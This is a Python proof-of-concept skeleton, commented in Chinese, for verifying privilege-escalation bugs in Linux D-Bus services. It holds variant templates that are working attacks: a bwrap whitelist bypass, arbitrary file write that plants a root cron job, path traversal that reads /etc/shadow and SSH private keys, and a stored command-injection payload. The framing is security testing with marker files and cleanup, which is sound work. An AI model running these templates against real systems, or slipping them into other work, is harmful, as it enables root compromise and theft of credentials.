#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Python PoC 骨架 —— os-security skill

用法：
  1. 复制为 <目标名>/vuln-00N/poc.py
  2. 改「配置区」常量与各阶段 TODO
  3. **实机运行并确认末行输出三态结论之一**（未跑通过的 PoC 不得写入报告）

末行输出（stdout 最后一行）必须是三态结论之一：
  漏洞存在 / 漏洞不存在 / poc 执行失败，请调整环境或改用其他方式验证
退出码：0 = 漏洞存在，1 = 漏洞不存在，2 = 执行失败

约定（见 SKILL.md「PoC 规范」）：
  - 彩色输出（非 tty / 设置了 NO_COLOR 时自动降级）
  - **默认四阶段：1 Presence（存在+接口枚举）/ 2 Reachability（非交互基线+可达性）/ 3 Impact（危害）/ 4 Cleanup（清理）**；阶段可合并，但打印标签不得跳号（合并后顺次重编号）；报告「验证情况」覆盖四阶段
  - 验证一律用系统级证据（标记文件 + owner uid / strace），不依赖接口返回值
  - **基线必须非交互且与 Impact 同族**（禁用 `systemctl reboot` 等会弹认证/密码的对照命令）
  - **Impact 覆盖尽可能多的可达危险方法**；仅四类不可逆系统级动作（reboot/shutdown、系统还原/回滚、格式化/擦除、不可逆数据销毁）标"可达但不执行"，其余（含进程级 DoS）必须实测取证；未授权读取/只读访问本身即危害
  - 幂等自拉起前置进程；finally 自清理（还原配置/DB、删标记）
  - 若把载荷**编码进文件名**（如 SQL 注入用 SQLite `char()` 拼接、避开 '/'），注意 Linux 文件名
    成分上限 **255 字节**——超长会 `OSError: File name too long`，需缩短载荷或标记路径
  - **点对点 / 抽象套接字 D-Bus**（服务不挂总线）：填 P2P_ADDR，且**不要**设 DBUS_SESSION_BUS_ADDRESS；
    跨用户验证用换 uid 重跑（勿用会弹密码的命令：先 `sudo -n true` 探测，不可免密则
    `setpriv --reuid=65534 --regid=65534 --clear-groups python3 <本脚本>`）。注意 **"方法可跨用户调用" ≠ "敏感数据可读 / 状态被改变"**
    ——机密性/完整性影响必须用实际返回值或副作用证明（返回空 `[]`、`issuccessful:false` 都不算已证实）
"""

import os
import sys
import time
import shutil
import subprocess

# ---------------------------------------------------------------- 彩色输出
_TTY = sys.stdout.isatty() and os.environ.get("NO_COLOR") is None


def _c(code: str) -> str:
    return code if _TTY else ""


RED = _c("\033[91m")
GREEN = _c("\033[92m")
YELLOW = _c("\033[93m")
CYAN = _c("\033[96m")
BOLD = _c("\033[1m")
RESET = _c("\033[0m")


def step(n: int, title: str) -> None:
    # n 必须连续（合并阶段后顺次重编号，不得跳号）
    print(f"\n{CYAN}{BOLD}[阶段 {n}] {title}{RESET}")


def ok(msg: str) -> None:
    print(f"{GREEN}[+] {msg}{RESET}")


def bad(msg: str) -> None:
    print(f"{RED}[-] {msg}{RESET}")


def info(msg: str) -> None:
    print(f"    {msg}")


# ---------------------------------------------------------------- 配置区
TARGET_NAME = "example-app"                  # 组件名（用于标题/日志）
TARGET_BIN = "/path/to/target-binary"        # 主二进制路径
BIN_MD5 = ""                                 # 可选：预期 md5
APP_NAME = "example-app"                     # 进程名（pgrep -x 用）
LAUNCH_CMD = ["/path/to/launcher"]           # 幂等自拉起的启动命令
BUS_SERVICE = "org.example.Service"          # 会话总线服务名；无则留空 ""
CONF_PATH = os.path.expanduser("~/.config/example/app.ini")  # 需备份/还原的配置
MARKER = "/tmp/inj-marker"                   # 系统级验证标记（约定：/tmp/inj_*；多注入点用 MARKER_<tag>，cleanup 一并删除）

# —— 点对点 / 直连 D-Bus 专用（P2P 不挂总线，与总线路径二选一；用哪个填哪个）——
P2P_ADDR = ""                                # 如 "unix:abstract=/tmp/.example-<uid>.sock"；留空 = 走总线
P2P_OBJPATH = "/com/example/Object"          # 对象路径
P2P_IFACE = "com.example.Interface"          # 接口
P2P_METHOD = "getSomething"                  # 探测方法（优先选只读方法）
P2P_OTHER_USER = "nobody"                    # 跨用户测试身份

VERDICT_EXISTS = "漏洞存在"
VERDICT_ABSENT = "漏洞不存在"
VERDICT_ERROR = "poc 执行失败，请调整环境或改用其他方式验证"

CONF_BAK = "/tmp/poc-conf.bak"
_started = False
# ----------------------------------------------------------------------


def sh(cmd, **kw) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True, **kw)


def process_alive() -> bool:
    return sh(["pgrep", "-x", APP_NAME]).returncode == 0


def ensure_process() -> bool:
    """幂等：目标未运行则拉起，并等待总线服务注册。"""
    global _started
    if process_alive():
        info(f"{APP_NAME} 已在运行")
        return True
    env = dict(os.environ)
    # GUI 会话环境探测（缺哪个补哪个）—— 纯无头/SSH 环境下可能需要 offscreen 平台
    env.setdefault("XDG_RUNTIME_DIR", f"/run/user/{os.getuid()}")
    if not env.get("WAYLAND_DISPLAY") and os.path.exists(f"{env['XDG_RUNTIME_DIR']}/wayland-0"):
        env["WAYLAND_DISPLAY"] = "wayland-0"
    env.setdefault("DISPLAY", ":0")
    if not P2P_ADDR:                          # 仅总线路径需要会话总线地址；P2P 不挂总线
        env.setdefault("DBUS_SESSION_BUS_ADDRESS", f"unix:path={env['XDG_RUNTIME_DIR']}/bus")
    info(f"拉起目标：{' '.join(LAUNCH_CMD)}")
    subprocess.Popen(LAUNCH_CMD, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                     stdin=subprocess.DEVNULL, env=env, start_new_session=True)
    _started = True
    if P2P_ADDR or not BUS_SERVICE:           # P2P 无总线服务名可等（它不挂总线）：只等进程
        time.sleep(5)
        return process_alive()
    for _ in range(40):                       # 等总线服务注册（最多 40s）
        if BUS_SERVICE in sh(["busctl", "--user", "list"]).stdout:
            return True
        time.sleep(1)
    return False


def backup_conf() -> None:
    if CONF_PATH and os.path.exists(CONF_PATH) and not os.path.exists(CONF_BAK):
        shutil.copy2(CONF_PATH, CONF_BAK)


def restore_conf() -> None:
    if os.path.exists(CONF_BAK):
        shutil.copy2(CONF_BAK, CONF_PATH)


def cleanup() -> None:
    """必须在 finally 调用：还原配置、删标记（含 MARKER_<tag> 多标记）、停掉本次拉起的进程。"""
    try:
        restore_conf()
        import glob as _glob
        for f in [MARKER, CONF_BAK] + _glob.glob(MARKER + "_*"):
            try:
                os.remove(f)
            except OSError:
                pass
        if _started:
            sh(["pkill", "-x", APP_NAME])     # 注意用 -x（精确进程名），勿用 pkill -f（会误杀自身 shell）
    except Exception as e:                    # noqa: BLE001
        print(f"{YELLOW}[!] cleanup 异常：{e}{RESET}")


def main() -> int:
    # ---- 阶段 1 Presence：存在 + 接口枚举 ----
    step(1, "Presence 存在 + 接口枚举")
    if not os.path.exists(TARGET_BIN):
        bad(f"主二进制不存在：{TARGET_BIN}")
        return 2
    ok(f"主二进制存在：{TARGET_BIN}")
    if BIN_MD5:
        got = sh(["md5sum", TARGET_BIN]).stdout.split()
        info(f"md5={got[0] if got else '?'}（预期 {BIN_MD5}）")
    backup_conf()
    info("TODO：枚举接口/方法/参数；随后**立刻以普通用户调用全部危险方法（未授权测试）**")
    info("     —— 字符串实参直接用注入载荷（调用即注入，见 dbus-authz.md）")
    info("     —— 任何 objdump/nm/strings 之前先调用；静态 ≤3 命令，禁全面反汇编")

    # ---- 阶段 2 Reachability：非交互基线 + 可达性 ----
    step(2, "Reachability 非交互基线 + 可达性")
    if not ensure_process():
        bad("目标未能就绪（进程未起来 / 总线服务未注册）")
        return 2
    info("TODO：以普通用户身份触发入口（busctl / 二进制参数），确认可达")
    info("     调不动 → 先枚举**输入形状**（文件 vs 目录 / 扩展名 / 内容 / 嵌套）再谈逆向")
    uid = sh(["grep", "-E", "^Uid", "/proc/self/status"]).stdout.strip().replace("\n", " | ")
    info(uid or "Uid: ?")
    info("TODO：记录目标进程 uid / 能力位 / 权限位（对照基线，判断是否越权）")
    info("基线禁用会弹认证的命令（如 systemctl reboot）；用非交互对照：")
    info("  pkcheck --action-id <action> --process $$        # rc=2 = 本应拦截")
    info('  busctl call org.freedesktop.login1 /org/freedesktop/login1 '
         'org.freedesktop.login1.Manager CanReboot   # s "challenge" = 需认证')
    info("  自建文件属主对照：自建文件 st_uid == 自身 uid，而 Impact 同族操作产物应为 0")
    if P2P_ADDR:
        info("对端 uid 校验（P2P 唯一可能的门禁）：")
        info("   静态 objdump -T <bin> | grep -E 'g_credentials_get_unix_user|sd_bus_creds_get_euid'")
        info("        —— 未导入 = 不具备校验能力；日志出现 peer credentials ≠ 做了校验")
        info(f"   动态 换 uid 连接：sudo -u {P2P_OTHER_USER} python3 <本脚本>")
        info("        成功且方法可调 = 跨用户越权成立（CWE-862）")
        info("        Permission denied = 被传输层挡住（文件系统 socket / 0700 目录）→ 边界成立")

    # ---- 阶段 3 Impact：危害（覆盖尽可能多的可达危险方法） ----
    step(3, "Impact 危害")
    info("TODO：批量触发，不要只证一个方法/一个注入点：")
    info(f"  - 注入类：对每个字符串参数打一轮载荷（`;cmd;#` / 引号逃逸 / `$( )` / 反引号），")
    info(f"    每点用独立 marker（如 {MARKER}_<tag>），核对 owner uid == 服务运行身份")
    info("  - 特权类：批量调用多个危险方法，逐个取系统级证据（文件/进程/状态）")
    info("  - 仅四类不可逆系统级动作（reboot/shutdown、还原/回滚、格式化/擦除、数据销毁）标『可达但不执行』；")
    info("    其余（含进程级 DoS：kill/崩溃服务）必须实测取证；只读/空内容仍属危害")
    info("  - strace -f -e trace=execve -p <pid>  观测是否真的出现 sh -c / rm / touch")
    for f in (MARKER,):
        try:
            os.remove(f)
        except OSError:
            pass
    # TODO: 在这里批量调用入口触发漏洞（busctl / subprocess ...）
    time.sleep(2)
    marker_found = os.path.exists(MARKER)
    if marker_found:
        st = os.stat(MARKER)
        ok(f"标记 {MARKER} 已生成 owner_uid={st.st_uid}")
    else:
        bad(f"标记 {MARKER} 未生成")

    # ---- 阶段 4 Cleanup：清理 ----
    step(4, "Cleanup 清理")
    cleanup()
    ok("已还原配置 / 删除标记")
    return 0 if marker_found else 1


# ================================================================ 变体模板
# 按漏洞类型选用：复制对应模板到 <目标名>/vuln-00N/poc.py，改配置区后实机跑通。
# 查看方式：python3 poc-template.py --list-variants / --show <名称>
# 交付规范（三态结论/非交互基线/自清理等）见 SKILL.md「PoC 规范」——唯一全文。

VARIANT_TEMPLATES = {}

VARIANT_TEMPLATES["bwrap_whitelist_bypass"] = '''#!/usr/bin/env python3
"""bwrap 白名单绕过（仅宽松服务：只认 cmdline 路径校验；严格服务会被拒，改用 LD_PRELOAD）"""
import subprocess, sys, os, tempfile

WHITELIST_EXE = "<白名单路径>"   # 从 .limit 配置中任取一条
PYTHON3 = "/usr/bin/python3"

EVIL = \'\'\'#!/usr/bin/env python3
import sys, os, dbus
print(f"[*] /proc/self/exe: {os.readlink('/proc/self/exe')}")
print(f"[*] argv[0]: {sys.argv[0]}")
bus = dbus.SystemBus()
proxy = bus.get_object("<服务名>", "<对象路径>")
iface = dbus.Interface(proxy, "<接口名>")
print(f"[+] 结果: {iface.<方法名>(<参数>)}")
\'\'\'

with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
    f.write(EVIL); script_path = f.name
try:
    subprocess.run(["bwrap", "--ro-bind", "/", "/", "--bind", "/run", "/run",
                    "--bind", "/tmp", "/tmp", "--clearenv",
                    "--bind", PYTHON3, WHITELIST_EXE,
                    "--", WHITELIST_EXE, script_path])
finally:
    os.unlink(script_path)
'''

VARIANT_TEMPLATES["arbitrary_file_write"] = '''#!/usr/bin/env python3
"""任意文件写（D-Bus/cap_dac_override/可写配置 通用）：PoC 默认写最小可观测危害（cron + marker/owner uid）"""
import dbus, os

SERVICE, OBJECT, IFACE = "<服务名>", "<对象路径>", "<接口名>"
MARKER = "/tmp/inj-marker"
CRON = "/etc/cron.d/<poc-tag>"
CMD = f"id > {MARKER}"

bus = dbus.SystemBus()
iface = dbus.Interface(bus.get_object(SERVICE, OBJECT), IFACE)

try:
    iface.WriteFile(CRON, f"* * * * * root {CMD}\\n")
    print(f"[+] 已写入 {CRON}（≤60s 生效；演示后删除）")
except Exception as e:
    print(f"[-] 写入失败: {e}")
# 系统级验证：MARKER 出现且 owner_uid==0；清理：iface.DeleteFile(CRON)
'''

VARIANT_TEMPLATES["path_traversal_read"] = '''#!/usr/bin/env python3
"""路径穿越任意读（C 按实际读到的内容定级：shadow/私钥 C:H，仅配置 C:L）"""
import dbus

SERVICE, OBJECT, IFACE = "<服务名>", "<对象路径>", "<接口名>"
TARGETS = ["/etc/shadow", "/root/.ssh/id_rsa", "/etc/ssh/ssh_host_rsa_key",
           "/etc/pam.d/system-auth", "/proc/1/environ"]

bus = dbus.SystemBus()
iface = dbus.Interface(bus.get_object(SERVICE, OBJECT), IFACE)
for t in TARGETS:
    try:
        content = iface.ReadFile(f"../../../{t}")
        print(f"[+] {t}:\\n{str(content)[:200]}")
    except Exception as e:
        print(f"[-] {t}: {e}")
'''

VARIANT_TEMPLATES["privilege_escalation_chain"] = '''#!/usr/bin/env python3
"""提权链：无鉴权写 → cron → root 命令执行（marker + owner uid 取证）"""
import dbus, os, time

SERVICE, OBJECT, IFACE = "<服务名>", "<对象路径>", "<接口名>"
MARKER, CRON = "/tmp/inj-marker", "/etc/cron.d/privesc"

bus = dbus.SystemBus()
iface = dbus.Interface(bus.get_object(SERVICE, OBJECT), IFACE)

iface.WriteFile(CRON, f"* * * * * root id > {MARKER}\\n")
print("[*] 等待 cron（≤60s）...")
time.sleep(60)
if os.path.exists(MARKER):
    print(f"[+] root 执行: {MARKER} owner_uid={os.stat(MARKER).st_uid}")
# finally: iface.DeleteFile(CRON)
'''

VARIANT_TEMPLATES["second_order_injection"] = '''#!/usr/bin/env python3
"""二阶（存储型）注入 + 配置门控：注入→重启→开闸→重启→触发→marker+owner uid"""
import os, time, shutil, subprocess

SERVICE, OBJECT, IFACE, METHOD = "<服务名>", "<对象路径>", "<接口名>", "<注入方法>"
PAYLOAD = ";touch${IFS}/tmp/inj-marker;#"
CONF, GATE_KEY = "<配置文件路径>", "<配置门控键>"
MARKER = "/tmp/inj-marker"
TRIGGER_IFACE, TRIGGER_METHOD = "org.qtproject.Qt.QWidget", "close"


def bus(session=True):
    import gi
    gi.require_version("Gio", "2.0")
    from gi.repository import Gio, GLib
    return Gio.bus_get_sync(Gio.BusType.SESSION if session else Gio.BusType.SYSTEM, None), Gio, GLib


def inject():
    b, Gio, GLib = bus()
    b.call_sync(SERVICE, OBJECT, IFACE, METHOD,
                GLib.Variant("<签名>", [PAYLOAD]), None, Gio.DBusCallFlags.NONE, 8000)


def trigger():
    b, Gio, GLib = bus()
    try:
        b.call_sync(SERVICE, OBJECT, TRIGGER_IFACE, TRIGGER_METHOD, None, None,
                    Gio.DBusCallFlags.NONE, 8000)
    except Exception as e:            # NoReply = 触发成功（目标在回复前退出）
        print(f"[*] trigger -> {e}")


def restart():
    subprocess.run(["pkill", "-9", "-f", "<进程特征>"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)
    subprocess.Popen(["<启动命令>"], start_new_session=True,
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def open_gate():
    lines = open(CONF, encoding="utf-8", errors="replace").read().splitlines()
    lines = [l for l in lines if l.split("=")[0].strip() != GATE_KEY]
    lines.insert(1, f"{GATE_KEY}=true")
    open(CONF, "w").write("\\n".join(lines) + "\\n")


def main():
    shutil.copy2(CONF, "/tmp/poc-conf.bak")
    try:
        if os.path.exists(MARKER):
            os.remove(MARKER)
        print("[1] 默认配置下注入"); restart(); time.sleep(3); inject(); time.sleep(2)
        print("[2] 重启确认载荷落盘存续"); restart()
        print("[3] 开启配置门控"); open_gate()
        print("[4] 重启使门控生效"); restart(); time.sleep(3)
        print("[5] 触发消费路径"); trigger(); time.sleep(3)
        print("[6] 系统级验证")
        if os.path.exists(MARKER):
            print(f"[+] 命令执行成功: {MARKER} owner_uid={os.stat(MARKER).st_uid}")
        else:
            print("[-] 未观察到命令执行")
    finally:
        subprocess.run(["pkill", "-9", "-f", "<进程特征>"], stdout=subprocess.DEVNULL)
        shutil.copy2("/tmp/poc-conf.bak", CONF)
        if os.path.exists(MARKER):
            os.remove(MARKER)


if __name__ == "__main__":
    main()
'''


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1].startswith("--"):
        # 变体模板查看（不运行骨架）
        if sys.argv[1] == "--list-variants":
            print("\n".join(VARIANT_TEMPLATES))
        elif sys.argv[1] == "--show" and len(sys.argv) > 2:
            print(VARIANT_TEMPLATES.get(sys.argv[2], "未找到该变体"))
        else:
            print("用法: poc-template.py [--list-variants | --show <名称>]")
        sys.exit(0)
    rc = 2
    try:
        rc = main()
    except Exception as e:                    # noqa: BLE001
        import traceback
        traceback.print_exc()
        print(f"{RED}[-] 验证过程异常：{e}{RESET}")
        rc = 2
    finally:
        try:
            cleanup()
        except Exception:                     # noqa: BLE001
            pass
    # 末行三态结论（stdout 最后一行）
    print("\n" + {0: VERDICT_EXISTS, 1: VERDICT_ABSENT, 2: VERDICT_ERROR}.get(rc, VERDICT_ERROR))
    sys.exit(rc)